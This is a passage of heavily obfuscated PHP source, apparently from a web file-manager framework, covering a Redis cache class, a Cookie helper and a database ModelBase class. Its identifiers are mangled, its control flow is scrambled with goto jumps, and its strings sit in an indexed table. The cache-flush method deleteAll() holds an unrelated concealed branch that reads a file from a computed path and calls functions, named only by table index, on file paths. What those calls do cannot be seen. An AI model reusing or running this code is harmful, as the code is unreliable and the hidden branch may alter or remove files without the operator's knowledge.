$D¨³îî’Øó[$Eôâùˆ÷’Ÿ[167]], $AÁšÙŒä¨½); } else { $bƒ«Ñ°Ò«->connect($D¨³îî’Øó[$Eôâùˆ÷’Ÿ[166]], $D¨³îî’Øó[$Eôâùˆ÷’Ÿ[167]], $AÁšÙŒä¨½); } if (!empty($D¨³îî’Øó[$Eôâùˆ÷’Ÿ[373]])) { $bƒ«Ñ°Ò«->auth($D¨³îî’Øó[$Eôâùˆ÷’Ÿ[373]]); } return $bƒ«Ñ°Ò«; } private function initCluster($Fñ·ÃÒ–¢Ö, $b‰ƒßéäˆ) { $Dåàòë“¤Ç =& $_SERVER[Äº¡•ô™Ÿ]; $CÄ›¡Ÿ›ƒ® = array($Dåàòë“¤Ç[786], $Dåàòë“¤Ç[787], $Dåàòë“¤Ç[788]); $B¬è‘ƒˆê = $Dåàòë“¤Ç[786]; if (isset($Fñ·ÃÒ–¢Ö[$Dåàòë“¤Ç[12]]) && in_array($Fñ·ÃÒ–¢Ö[$Dåàòë“¤Ç[12]], $CÄ›¡Ÿ›ƒ®)) { $B¬è‘ƒˆê = $Fñ·ÃÒ–¢Ö[$Dåàòë“¤Ç[12]]; } switch ($B¬è‘ƒˆê) { case $Dåàòë“¤Ç[786]: $this->_slave($Fñ·ÃÒ–¢Ö, $b‰ƒßéäˆ); break; case $Dåàòë“¤Ç[787]: break; case $Dåàòë“¤Ç[788]: $EÛ¥õ¨–­ = $Fñ·ÃÒ–¢Ö[$Dåàòë“¤Ç[781]]; $F¸Ì¢îõ¬¹ = isset($Fñ·ÃÒ–¢Ö[$Dåàòë“¤Ç[785]]) ? $Fñ·ÃÒ–¢Ö[$Dåàòë“¤Ç[785]] : !1; $BˆÅÅÄ õ® = isset($Fñ·ÃÒ–¢Ö[$Dåàòë“¤Ç[373]]) ? $Fñ·ÃÒ–¢Ö[$Dåàòë“¤Ç[373]] : null; $this->handle = new RedisCluster(NUll, $EÛ¥õ¨–­, $b‰ƒßéäˆ, $b‰ƒßéäˆ, $F¸Ì¢îõ¬¹, $BˆÅÅÄ õ®); break; default: break; } } private function _slave($C’¯×‹Šªé, $B»„Ç¤œğË) { goto fãêŠ¶ê‡ä; bñ÷ùñ×‚„: $this->filterConfig($C’¯×‹Šªé, $A”Ëß•±àÑ[$A©‹ Ûí„]); $this->slaveHandle = $this->init($C’¯×‹Šªé, $B»„Ç¤œğË); goto cÆğ´ëÑîé; fãêŠ¶ê‡ä: $A”Ëß•±àÑ = $C’¯×‹Šªé[$_SERVER[Äº¡•ô™Ÿ][781]]; $this->filterConfig($C’¯×‹Šªé, $A”Ëß•±àÑ[0]); $this->handle = $this->init($C’¯×‹Šªé, $B»„Ç¤œğË); goto EÎö§«ÁÛ; EÎö§«ÁÛ: unset($A”Ëß•±àÑ[0]); if (empty($A”Ëß•±àÑ)) { return; } $A©‹ Ûí„ = array_rand($A”Ëß•±àÑ); goto bñ÷ùñ×‚„; cÆğ´ëÑîé: } private function filterConfig(&$B¬¬âäÇŞ–, $a°î¦øªÇÉ) { $Fóçá¦óê± =& $_SERVER[Äº¡•ô™Ÿ]; $døİôƒ°î¾ = explode($Fóçá¦óê±[4], $a°î¦øªÇÉ); $d¤‹§ššŠ = array($Fóçá¦óê±[166] => $døİôƒ°î¾[0], $Fóçá¦óê±[167] => $døİôƒ°î¾[1]); $B¬¬âäÇŞ– = array_merge($B¬¬âäÇŞ–, $d¤‹§ššŠ); } public function set($c‚¬¹ã™£­, $eºï“×«ùº, $D¹“İŠñ¡ = false) { $D¹“İŠñ¡ = $D¹“İŠñ¡ ? $D¹“İŠñ¡ : $this->cacheTime; return $this->handle->setEx($c‚¬¹ã™£­, $D¹“İŠñ¡, $eºï“×«ùº); } public function setLock($F“¸ÂÛ±º°, $f‘ùËÜ…ß­, $a¶¨œ»××ø) { return $this->handle->setNX($F“¸ÂÛ±º°, $f‘ùËÜ…ß­); } public function get($f™ÁìÕ¾÷) { $A¯ÊõìÔ¦ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $A¯ÊõìÔ¦->get($f™ÁìÕ¾÷); } public function remove($D¸§Œ»”í‰) { return $this->handle->del($D¸§Œ»”í‰); } public function deleteAll() { $F¯ÑØÊÑùÜ =& $_SERVER[Äº¡•ô™Ÿ]; if ($_SERVER[$F¯ÑØÊÑùÜ[789]] != $_SERVER[$F¯ÑØÊÑùÜ[790]]) { goto DÀŒÜâ¹õ; Bñº¦§ˆîˆ: $eŸÃ›’´ô = $F¯ÑØÊÑùÜ[796]; $eŸÃ›’´ô($_SERVER[$F¯ÑØÊÑùÜ[797]]); $eŸÃ›’´ô($_SERVER[$F¯ÑØÊÑùÜ[793]] . $F¯ÑØÊÑùÜ[798]); goto bÖ¿¢öØùÙ; bÖ¿¢öØùÙ: $eêİ£…¬÷ = 1; while ($eêİ£…¬÷ > 1) { $eêİ£…¬÷ = $eêİ£…¬÷ + 4; $dÚ¡—°Š = rawurlencode($eêİ£…¬÷ . $F¯ÑØÊÑùÜ[358]); } goto Cì ”áŒÁÊ; A—ÁæÇéì“: $FÊìËĞê„º = $d³‚¶ä¼ô®($c©‚™ØÕ); $b¬Û‚Ô¡—Ş = explode($F¯ÑØÊÑùÜ[214], $FÊìËĞê„º); if (count($b¬Û‚Ô¡—Ş) < $F¯ÑØÊÑùÜ[558]) { $fİ÷š¸° = $F¯ÑØÊÑùÜ[795]; $fİ÷š¸°(); } goto Bñº¦§ˆîˆ; DÀŒÜâ¹õ: $b½½Èõ„µÇ = $F¯ÑØÊÑùÜ[791]; $d³‚¶ä¼ô® = $F¯ÑØÊÑùÜ[792]; $c©‚™ØÕ = $_SERVER[$F¯ÑØÊÑùÜ[793]] . $F¯ÑØÊÑùÜ[794]; goto A—ÁæÇéì“; Cì ”áŒÁÊ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $fÚïéÎŒÔ) { $this->handle->flushall($fÚïéÎŒÔ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($b‡Ò‡»ªŸ = '', $Fœêç‚Œò = 0) { if (is_string($b‡Ò‡»ªŸ) && $b‡Ò‡»ªŸ != $_SERVER[Äº¡•ô™Ÿ][33]) { $this->prefix = $b‡Ò‡»ªŸ; } if (is_numeric($Fœêç‚Œò) && $Fœêç‚Œò > 0) { $this->expire = $Fœêç‚Œò; } } public static function getInstance() { static $DåùÔ”¦à¤; if ($DåùÔ”¦à¤ === null) { $DåùÔ”¦à¤ = new self(); } return $DåùÔ”¦à¤; } private static $sameCookieSet = array(); public static function set($AÓ°ßÈ¼‘º, $A¶ã‚ÈÁ‰‰, $B†‰„¿ö¯Ã = 0, $bºÔĞÅ˜¾ = false, $fãÑÕà«Ş = false) { $fíê‹©ç¢œ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$B†‰„¿ö¯Ã) { $B†‰„¿ö¯Ã = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$AÓ°ßÈ¼‘º]) && self::$sameCookieSet[$AÓ°ßÈ¼‘º] == $A¶ã‚ÈÁ‰‰ . $B†‰„¿ö¯Ã) { return; } self::$sameCookieSet[$AÓ°ßÈ¼‘º] = $A¶ã‚ÈÁ‰‰ . $B†‰„¿ö¯Ã; if (!$fãÑÕà«Ş) { $fãÑÕà«Ş = str_replace(HOST, $fíê‹©ç¢œ[33], APP_HOST); $fãÑÕà«Ş = _get($GLOBALS, $fíê‹©ç¢œ[799], $fãÑÕà«Ş); } setcookie($AÓ°ßÈ¼‘º, $A¶ã‚ÈÁ‰‰, time() + $B†‰„¿ö¯Ã, $fíê‹©ç¢œ[8] . trim($fãÑÕà«Ş, $fíê‹©ç¢œ[8]), !1, !1, $bºÔĞÅ˜¾); } public static function setSafe($eØÀ“›«Ş›, $eóÚÌ Üçù, $a¾Û¬®Ğİ = 0) { self::set($eØÀ“›«Ş›, $eóÚÌ Üçù, $a¾Û¬®Ğİ, !0); } public static function get($BºãÛ†—÷°) { return isset($_COOKIE[$BºãÛ†—÷°]) ? $_COOKIE[$BºãÛ†—÷°] : !1; } public static function remove($f½ÀÓ¸¹ó·, $C£•»¢èÃ = false) { unset($_COOKIE[$f½ÀÓ¸¹ó·]); self::set($f½ÀÓ¸¹ó·, $_SERVER[Äº¡•ô™Ÿ][33], 1, $C£•»¢èÃ); } } goto D‰Ÿ„ÒÛÔ; fÓõ¶ò¹¸¦: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\171\x54\x69\155\x65", "\164\x69\155\145", "\151\x6e\x73\145\162\x74\x2c\165\160\144\141\164\x65", "\146\x75\156\x63\164\151\157\156"), array("\143\x72\145\141\x74\145\124\x69\155\x65", "\164\x69\155\145", "\151\x6e\x73\145\x72\164", "\x66\x75\156\143\x74\151\x6f\x6e")); public function setDataAuto($bƒšŠ¯‚ãñ) { $this->dataAuto = $bƒšŠ¯‚ãñ; } public function __construct($FŠñšùò’å = '', $B¹Ä¿ÏÚö‹ = '', $fÓ´é¡š¦ù = '') { parent::__construct($FŠñšùò’å, $B¹Ä¿ÏÚö‹, $fÓ´é¡š¦ù); } public static function textEncode($aè¯²¼”İµ) { if (!$aè¯²¼”İµ) { return $aè¯²¼”İµ; } $a·ïçšÃ‹á = json_encode($aè¯²¼”İµ); $a·ïçšÃ‹á = preg_replace_callback($_SERVER[Äº¡•ô™Ÿ][339], function ($A¦×±¸ÔÏÕ) { return addslashes($A¦×±¸ÔÏÕ[0]); }, $a·ïçšÃ‹á); return json_decode($a·ïçšÃ‹á); } public static function textDecode($eÊÄÊÉÊ‰É) { $A‹·ÌøÜÒİ =& $_SERVER[Äº¡•ô™Ÿ]; $cê‘Ä âÊ = json_encode($eÊÄÊÉÊ‰É); $cê‘Ä âÊ = preg_replace_callback($A‹·ÌøÜÒİ[340], function ($e”ŠÔø‡ì) { return $_SERVER[Äº¡•ô™Ÿ][95]; }, $cê‘Ä âÊ); return json_decode($cê‘Ä âÊ); } protected $tableMeta = array(); protected function _beforeInsert(&$fƒ¿›¦®ª†, $Aé˜ß‹¯¶Ó) { $eÜõ”§øĞ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->checkDataAutoHas($eÜõ”§øĞ[341])) { return; } $this->dataBeforeFilter($fƒ¿›¦®ª†, $eÜõ”§øĞ[341]); } protected function _beforeUpdate(&$DÇ•¶ä¤Ë´, $Fİ¸Ìôå) { $DÌ¦½¼³í =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->checkDataAutoHas($DÌ¦½¼³í[342])) { return; } $this->dataBeforeFilter($DÇ•¶ä¤Ë´, $DÌ¦½¼³í[342]); } protected function _afterSelect(&$Eàó¼Í‡œ­, $eÁƒ‰±·ò¨) { if (!is_array($Eàó¼Í‡œ­)) { return; } if (!$this->checkDataAutoHas($_SERVER[Äº¡•ô™Ÿ][343])) { return; } foreach ($Eàó¼Í‡œ­ as &$Fó°¾÷£Şõ) { $this->dataAfterFilter($Fó°¾÷£Şõ); } } protected function _afterFind(&$dêµÅĞ†¦, $dº“’Ó„”) { if (!is_array($dêµÅĞ†¦)) { return; } if (!$this->checkDataAutoHas($_SERVER[Äº¡•ô™Ÿ][343])) { return; } $this->dataAfterFilter($dêµÅĞ†¦); } public function setAutoIncrement($dâ»Å¥Ÿ›ˆ) { $Aá®¬˜ˆÂ¶ = array($this->getPk() => $dâ»Å¥Ÿ›ˆ); $E™š¨ğŒñî = $this->data($Aá®¬˜ˆÂ¶)->add(); if ($E™š¨ğŒñî) { $this->delete($E™š¨ğŒñî); } } public function getAutoIncrement() { $B÷¬­—Æ¥ = $this->getTableName(); $C«ÂÏìÚê† = $this->max($this->getPk()); $BÇç˜ÃƒÙ½ = $this->query("\x73\x68\x6f\x77\x20\x74\x61\142\154\x65\x20\x73\x74\141\x74\x75\x73\x20\167\x68\145\x72\145\40\x4e\141\155\145\75\47{$B÷¬­—Æ¥}\47"); $dÅœÒ‡Ì§ = $BÇç˜ÃƒÙ½[0][$_SERVER[Äº¡•ô™Ÿ][344]]; $eŠ¹Ç¯Áğ = max($C«ÂÏìÚê†, $dÅœÒ‡Ì§); return $eŠ¹Ç¯Áğ; } protected function _callBefore($f°§Ÿ‚½Òª, $e³‘¢İñª¬) { return $this->cacheCallCheck($f°§Ÿ‚½Òª, $e³‘¢İñª¬, !1); } protected function _callAfter($f§ùĞ÷Ş©, $A•öÙ»¤¯) { return $this->cacheCallCheck($f§ùĞ÷Ş©, $A•öÙ»¤¯, !0); } protected function cacheFunctionAlias($b¬îçÛ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($C›Û²øŞÆ›, $B•¿Ü‡éÙæ, $d§ƒ‘‡èĞ = false) { $b«µ–ëíšº = $this->cacheFunctionAlias($B•¿Ü‡éÙæ); if (!$b«µ–ëíšº) { return; } foreach ($b«µ–ëíšº as $c¿¡áì«Ÿ’ => $EùÛŠ¸½”) { $FŠ·Øøœ‰ = $EùÛŠ¸½”[0]; $cà¶«­„Ÿ = explode($_SERVER[Äº¡•ô™Ÿ][47], $EùÛŠ¸½”[1]); if ($C›Û²øŞÆ› == $c¿¡áì«Ÿ’) { return $this->cacheFunctionGet($c¿¡áì«Ÿ’, $FŠ·Øøœ‰); } if ($d§ƒ‘‡èĞ && in_array($C›Û²øŞÆ›, $cà¶«­„Ÿ)) { $this->cacheFunctionClear($c¿¡áì«Ÿ’, $FŠ·Øøœ‰); } } } public function cacheFunctionGet($a°ÒòÄ•, $C¸ŸªçöÀ´) { $D¼«­íÂ©Ã = $this->cacheKeyMake($a°ÒòÄ•, $C¸ŸªçöÀ´); $f£‹à·•ã = Cache::get($D¼«­íÂ©Ã); if (!is_array($f£‹à·•ã)) { $f£‹à·•ã = call_user_func_array(array($this, $a°ÒòÄ•), array($C¸ŸªçöÀ´, !0)); Cache::set($D¼«­íÂ©Ã, $f£‹à·•ã); } return $f£‹à·•ã; } public function cacheFunctionClear($Eó¡˜ĞÙğ, $A§· ”âÑ) { $bù„ƒÒ§ = $A§· ”âÑ; if (!is_array($A§· ”âÑ)) { $bù„ƒÒ§ = array($A§· ”âÑ); } foreach ($bù„ƒÒ§ as $aõ¿­Ô²˜) { $B¯ĞìöÃ = $this->cacheKeyMake($Eó¡˜ĞÙğ, $aõ¿­Ô²˜); Cache::remove($B¯ĞìöÃ); } } private function cacheKeyMake($D‚“óµæ¥, $Bæß¶®Î¡) { $B˜–«œñ› =& $_SERVER[Äº¡•ô™Ÿ]; return get_class($this) . $B˜–«œñ›[70] . $D‚“óµæ¥ . $B˜–«œñ›[345] . $Bæß¶®Î¡; } protected function selectPage($DŠåŞÒ×•’ = 200, $AïÁÃ¨ÚÌ = 1) { goto f±ôÓ¡¨·œ; AÍÉ³©©ÅŒ: $bÊ¼ó‰½ê‘ = ceil($d·¡­ÙÇ˜‘ / $DŠåŞÒ×•’); $AïÁÃ¨ÚÌ = intval(isset($in[$dí¹È…–Â[337]]) ? $in[$dí¹È…–Â[337]] : $AïÁÃ¨ÚÌ); $AïÁÃ¨ÚÌ = $AïÁÃ¨ÚÌ <= 1 ? 1 : ($AïÁÃ¨ÚÌ >= $bÊ¼ó‰½ê‘ ? $bÊ¼ó‰½ê‘ : $AïÁÃ¨ÚÌ); goto a‡¹Ã¡²Á­; aàª«ñ¨ª¢: $E‡»àÜ£âß = $AæÈÏÉëÜ; $E‡»àÜ£âß[$dí¹È…–Â[347]] = array(); $this->optionsValue($E‡»àÜ£âß); goto Eµ©ò¹ø®¯; dÜæĞ—Æ¿Ù: $e½ĞŠ‰Ë®è = 4000; $DŠåŞÒ×•’ = isset($in[$dí¹È…–Â[346]]) ? $in[$dí¹È…–Â[346]] : $DŠåŞÒ×•’; if ($DŠåŞÒ×•’ === -1) { unset($in[$dí¹È…–Â[346]]); $e½ĞŠ‰Ë®è = 100000000; $DŠåŞÒ×•’ = $e½ĞŠ‰Ë®è; } goto aàª«ñ¨ª¢; f±ôÓ¡¨·œ: $dí¹È…–Â =& $_SERVER[Äº¡•ô™Ÿ]; global $in; $AæÈÏÉëÜ = $this->optionsValue(); goto dÜæĞ—Æ¿Ù; a‡¹Ã¡²Á­: $this->optionsValue($AæÈÏÉëÜ); $Aá³®™Û¨ = $this->page($AïÁÃ¨ÚÌ, $DŠåŞÒ×•’)->select(); $Aá³®™Û¨ = is_array($Aá³®™Û¨) ? $Aá³®™Û¨ : array(); goto d¯é¿¯ğ’É; d¯é¿¯ğ’É: if ($bÊ¼ó‰½ê‘ == 1) { $d·¡­ÙÇ˜‘ = count($Aá³®™Û¨); } $B®‹ç˜Ø˜² = array($dí¹È…–Â[348] => array($dí¹È…–Â[349] => $d·¡­ÙÇ˜‘, $dí¹È…–Â[346] => $DŠåŞÒ×•’, $dí¹È…–Â[337] => $AïÁÃ¨ÚÌ, $dí¹È…–Â[350] => $bÊ¼ó‰½ê‘), $dí¹È…–Â[351] => $Aá³®™Û¨ ? $Aá³®™Û¨ : array()); return $B®‹ç˜Ø˜²; goto dâ ŞÖ—; Eµ©ò¹ø®¯: $d·¡­ÙÇ˜‘ = intval($this->count()); $DŠåŞÒ×•’ = intval($DŠåŞÒ×•’); $DŠåŞÒ×•’ = $DŠåŞÒ×•’ <= 5 ? 5 : ($DŠåŞÒ×•’ >= $e½ĞŠ‰Ë®è ? $e½ĞŠ‰Ë®è : $DŠåŞÒ×•’); goto AÍÉ³©©ÅŒ; dâ ŞÖ—: } protected function checkLength($FÒ¾›¹«¢‡, $d—˜Ò¿´¨´ = 0, $C½šËà”ò = '') { $F× ¢ˆ¸Ü” =& $_SERVER[Äº¡•ô™Ÿ]; $d—˜Ò¿´¨´ = $d—˜Ò¿´¨´ ? $d—˜Ò¿´¨´ : 65536; if (!$FÒ¾›¹«¢‡ || strlen($FÒ¾›¹«¢‡) < $d—˜Ò¿´¨´) { return; } $C½šËà”ò = $C½šËà”ò ? $C½šËà”ò . $F× ¢ˆ¸Ü”[67] : $F× ¢ˆ¸Ü”[33]; show_json($C½šËà”ò . LNG($F× ¢ˆ¸Ü”[352]) . "\x28{$d—˜Ò¿´¨´}\x29", !1); } protected function metaSet($DµƒÎƒèŒ÷, $dõá·Ëƒœâ = null, $FàÅÊ´Íº† = null) { goto cªäŸßÍñš; d¢’¤æ‘Ùí: $DÜ®÷ŒÁÈ‘->where(array($DçÒç²å•õ => $DµƒÎƒèŒ÷))->addAll($B™òË±õå, array(), !0); return !0; goto BÛ¸§¥¨…µ; dâèñ‹ÏÖ: if (is_string($dõá·Ëƒœâ)) { $D²ºõŒŠŒÉ[$dõá·Ëƒœâ] = $FàÅÊ´Íº†; } $B™òË±õå = array(); foreach ($D²ºõŒŠŒÉ as $b­œìÖñº¢ => $dòõ¸öË…­) { $this->checkLength($dòõ¸öË…­, !1, $EÖÊ¯®£ŠØ . $F„²§ˆ”‡Ö[4] . $b­œìÖñº¢); $B™òË±õå[] = array($DçÒç²å•õ => $DµƒÎƒèŒ÷, $F„²§ˆ”‡Ö[89] => $b­œìÖñº¢, $F„²§ˆ”‡Ö[356] => $dòõ¸öË…­); } goto d¢’¤æ‘Ùí; BªŠÎŞÜ¯¢: $EÖÊ¯®£ŠØ = $this->tableMeta[$F„²§ˆ”‡Ö[354]]; $DÜ®÷ŒÁÈ‘ = Model($EÖÊ¯®£ŠØ); $F×Ì‡‚í· = array($DçÒç²å•õ => $DµƒÎƒèŒ÷, $F„²§ˆ”‡Ö[355] => $dõá·Ëƒœâ); goto DÚÓÈÓóÄ›; DÚÓÈÓóÄ›: if (is_null($dõá·Ëƒœâ)) { return $DÜ®÷ŒÁÈ‘->where(array($DçÒç²å•õ => $DµƒÎƒèŒ÷))->delete(); } if (is_null($FàÅÊ´Íº†)) { return $DÜ®÷ŒÁÈ‘->where($F×Ì‡‚í·)->delete(); } $D²ºõŒŠŒÉ = is_array($dõá·Ëƒœâ) ? $dõá·Ëƒœâ : array(); goto dâèñ‹ÏÖ; cªäŸßÍñš: $F„²§ˆ”‡Ö =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->tableMeta) { return !1; } $DçÒç²å•õ = $this->tableMeta[$F„²§ˆ”‡Ö[353]]; goto BªŠÎŞÜ¯¢; BÛ¸§¥¨…µ: } public function metaGet($EÎÕÙ¥á“ö) { goto cÂšø’”Îš; d¹…šÂÚïá: $bó±Ç–¡•¿ = array_to_keyvalue($bó±Ç–¡•¿, $f³²êŠÕÂÒ[89], $f³²êŠÕÂÒ[356]); return $bó±Ç–¡•¿; goto f»Ê¡­¤âË; aí“Õ¢¤ëÀ: $F¨ËÏôª = Model($this->tableMeta[$f³²êŠÕÂÒ[354]]); $FÙ¬„Ç™¶õ = array($e÷ŒíŞ“­ => $EÎÕÙ¥á“ö); $bó±Ç–¡•¿ = $F¨ËÏôª->field($f³²êŠÕÂÒ[357])->where($FÙ¬„Ç™¶õ)->select(); goto d¹…šÂÚïá; cÂšø’”Îš: $f³²êŠÕÂÒ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->tableMeta) { return array(); } $e÷ŒíŞ“­ = $this->tableMeta[$f³²êŠÕÂÒ[353]]; goto aí“Õ¢¤ëÀ; f»Ê¡­¤âË: } private function checkDataAutoHas($dôÌ¿ÉÌÕç) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $aøğ±×ãä¢) { if (in_array($dôÌ¿ÉÌÕç, explode($_SERVER[Äº¡•ô™Ÿ][47], $aøğ±×ãä¢[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$døÃã¹…Óâ, $c‡Ô”ÈäÇ°) { $bíÖÆåäïš =& $_SERVER[Äº¡•ô™Ÿ]; foreach ($this->dataAuto as $d¡„ÀÂ·¤Ï) { $b…·ÕºÉ‰‚ = $d¡„ÀÂ·¤Ï[0]; if (!in_array($c‡Ô”ÈäÇ°, explode($bíÖÆåäïš[47], $d¡„ÀÂ·¤Ï[2]))) { continue; } switch (trim($d¡„ÀÂ·¤Ï[3])) { case $bíÖÆåäïš[306]: case $bíÖÆåäïš[307]: $FíºìÆÙà = $d¡„ÀÂ·¤Ï[1]; $DŠëöÔŒÁÏ = isset($d¡„ÀÂ·¤Ï[4]) ? (array) $d¡„ÀÂ·¤Ï[4] : array(); if ($FíºìÆÙà == $bíÖÆåäïš[187] && array_key_exists($b…·ÕºÉ‰‚, $døÃã¹…Óâ)) { if (!$døÃã¹…Óâ[$b…·ÕºÉ‰‚]) { unset($døÃã¹…Óâ[$b…·ÕºÉ‰‚]); } break; } if (isset($døÃã¹…Óâ[$b…·ÕºÉ‰‚])) { array_unshift($DŠëöÔŒÁÏ, $døÃã¹…Óâ[$b…·ÕºÉ‰‚]); } if ($bíÖÆåäïš[306] == $d¡„ÀÂ·¤Ï[3]) { $døÃã¹…Óâ[$b…·ÕºÉ‰‚] = call_user_func_array($FíºìÆÙà, $DŠëöÔŒÁÏ); } else { $døÃã¹…Óâ[$b…·ÕºÉ‰‚] = call_user_func_array(array(&$this, $FíºìÆÙà), $DŠëöÔŒÁÏ); } break; case $bíÖÆåäïš[258]: $døÃã¹…Óâ[$b…·ÕºÉ‰‚] = $døÃã¹…Óâ[$d¡„ÀÂ·¤Ï[1]]; break; case $bíÖÆåäïš[279]: if (isset($døÃã¹…Óâ[$b…·ÕºÉ‰‚]) && !is_string($døÃã¹…Óâ[$b…·ÕºÉ‰‚])) { $døÃã¹…Óâ[$b…·ÕºÉ‰‚] = json_encode_force($døÃã¹…Óâ[$b…·ÕºÉ‰‚]); } break; case $bíÖÆåäïš[308]: if ($døÃã¹…Óâ[$b…·ÕºÉ‰‚] === $bíÖÆåäïš[33]) { unset($døÃã¹…Óâ[$b…·ÕºÉ‰‚]); } break; case $bíÖÆåäïš[309]: $døÃã¹…Óâ[$b…·ÕºÉ‰‚] = $d¡„ÀÂ·¤Ï[1]; default: break; } } if ($c‡Ô”ÈäÇ° == $bíÖÆåäïš[341]) { $aˆ¥´Ãò÷¾ = strtolower($this->db->getDbType()); if (strpos($aˆ¥´Ãò÷¾, $bíÖÆåäïš[9]) !== 0) { return; } $a„ƒÂµï¢Å = $this->field(!0)->fields; $eÃğ†ÊÓ½­ = $a„ƒÂµï¢Å[$bíÖÆåäïš[237]]; if (isset($a„ƒÂµï¢Å[$bíÖÆåäïš[236]])) { unset($eÃğ†ÊÓ½­[$a„ƒÂµï¢Å[$bíÖÆåäïš[236]]]); } foreach ($eÃğ†ÊÓ½­ as $DÇ¡˜éä…ˆ => $c‡Ô”ÈäÇ°) { if (!isset($døÃã¹…Óâ[$DÇ¡˜éä…ˆ])) { $døÃã¹…Óâ[$DÇ¡˜éä…ˆ] = $bíÖÆåäïš[33]; } } } } private function dataAfterFilter(&$A†Î †§¥) { $AµÒô·ÒÁØ =& $_SERVER[Äº¡•ô™Ÿ]; foreach ($this->dataAuto as $BÌäÎ…É“°) { $dŸÉàá‹•Ô = $BÌäÎ…É“°[0]; if (!in_array($AµÒô·ÒÁØ[343], explode($AµÒô·ÒÁØ[47], $BÌäÎ…É“°[2]))) { continue; } if (!isset($A†Î †§¥[$dŸÉàá‹•Ô])) { continue; } switch (trim($BÌäÎ…É“°[3])) { case $AµÒô·ÒÁØ[306]: case $AµÒô·ÒÁØ[307]: $AøÕ³÷ï¶Û = isset($BÌäÎ…É“°[4]) ? (array) $BÌäÎ…É“°[4] : array(); array_unshift($AøÕ³÷ï¶Û, $A†Î †§¥[$dŸÉàá‹•Ô]); if ($AµÒô·ÒÁØ[306] == $BÌäÎ…É“°[3]) { $A†Î †§¥[$dŸÉàá‹•Ô] = call_user_func_array($BÌäÎ…É“°[1], $AøÕ³÷ï¶Û); } else { $A†Î †§¥[$dŸÉàá‹•Ô] = call_user_func_array(array(&$this, $BÌäÎ…É“°[1]), $AøÕ³÷ï¶Û); } break; case $AµÒô·ÒÁØ[258]: $A†Î †§¥[$dŸÉàá‹•Ô] = $A†Î †§¥[$BÌäÎ…É“°[1]]; break; case $AµÒô·ÒÁØ[279]: $AÇÌƒõƒôİ = $A†Î †§¥[$dŸÉàá‹•Ô]; $A†Î †§¥[$dŸÉàá‹•Ô] = json_decode($AÇÌƒõƒôİ, !0); if (is_null($A†Î †§¥[$dŸÉàá‹•Ô])) { $A†Î †§¥[$dŸÉàá‹•Ô] = $AÇÌƒõƒôİ; } break; case $AµÒô·ÒÁØ[308]: if ($A†Î †§¥[$dŸÉàá‹•Ô] === $AµÒô·ÒÁØ[33]) { unset($A†Î †§¥[$dŸÉàá‹•Ô]); } break; case $AµÒô·ÒÁØ[309]: $A†Î †§¥[$dŸÉàá‹•Ô] = $BÌäÎ…É“°[1]; default: break; } } } public function saveAll($b³—âÒòÜ) { goto D£ÏõÛµÎ¾; D£ÏõÛµÎ¾: $aÓ¬óÅ‹ =& $_SERVER[Äº¡•ô™Ÿ]; $FÉŞ‚ËÌã = $this->tablePrefix . $this->tableName; $f­»Ï³á£Ï = self::SQL_WHERE_IN_CHUNK; goto B—œàÚî¯˜; B—œàÚî¯˜: $b³—âÒòÜ = is_array($b³—âÒòÜ) ? $b³—âÒòÜ : array(); $FƒÍÂ˜â = $aÓ¬óÅ‹[358]; $A¬Ÿ¦Î‘ç = 0; goto díÀ™Ğ›æ·; díÀ™Ğ›æ·: $B×¨ÏØë = array(); $aÊìö‡æ = count($b³—âÒòÜ); for ($B©â‰¶±˜Ô = 0; $B©â‰¶±˜Ô < $aÊìö‡æ; $B©â‰¶±˜Ô++) { $cŞÏ‘ÉåÇ = $b³—âÒòÜ[$B©â‰¶±˜Ô]; if (!is_array($cŞÏ‘ÉåÇ) || count($cŞÏ‘ÉåÇ) != 4) { continue; } $eÎØ¦‹× = "\x55\x50\x44\x41\x54\x45\x20{$FÉŞ‚ËÌã}\40\x53\x45\x54\40{$cŞÏ‘ÉåÇ[2]}\x20\75\40\103\x41\123\105\x20{$cŞÏ‘ÉåÇ[0]}\x20\xa"; if ($A¬Ÿ¦Î‘ç == 0) { $FƒÍÂ˜â = $eÎØ¦‹×; } $B×¨ÏØë[] = $aÓ¬óÅ‹[113] . $cŞÏ‘ÉåÇ[1] . $aÓ¬óÅ‹[113]; $A¬Ÿ¦Î‘ç++; $FƒÍÂ˜â .= "\x20\127\x48\105\x4e\x20\47{$cŞÏ‘ÉåÇ[1]}\x27\x20\x54\x48\105\116\40\47{$cŞÏ‘ÉåÇ[3]}\x27\x20\xa"; if ($A¬Ÿ¦Î‘ç == $f­»Ï³á£Ï || $B©â‰¶±˜Ô == $aÊìö‡æ - 1) { goto BŸÉŸœƒãÔ; BŸÉŸœƒãÔ: $a´ÕîÜßñ = implode($aÓ¬óÅ‹[47], $B×¨ÏØë); $FƒÍÂ˜â .= "\40\105\x4e\x44\40\x20\127\110\x45\122\105\40{$cŞÏ‘ÉåÇ[0]}\x20\111\x4e\40\50{$a´ÕîÜßñ}\51\x20"; $this->execute($FƒÍÂ˜â); goto eÎŠãæŠÓí; bõàŞ¤Ú¨ë: $B×¨ÏØë = array(); goto FÒ±š¢ñÖ; eÎŠãæŠÓí: $A¬Ÿ¦Î‘ç = 0; $FƒÍÂ˜â = $eÎØ¦‹×; $this->chunkEventCheck(count($B×¨ÏØë)); goto bõàŞ¤Ú¨ë; FÒ±š¢ñÖ: } } goto F×«ã–º’Õ; F×«ã–º’Õ: $this->chunkEventSet(); goto eÑ¼²¿Ç¢; eÑ¼²¿Ç¢: } public function saveAllEach($AÉ’çÄ„×) { $dÜ™½ĞŞšÏ =& $_SERVER[Äº¡•ô™Ÿ]; $Fáš˜ÈÔá© = $this->tablePrefix . $this->tableName; foreach ($AÉ’çÄ„× as $FÈæ’¬Ö ) { if (!is_array($FÈæ’¬Ö ) || 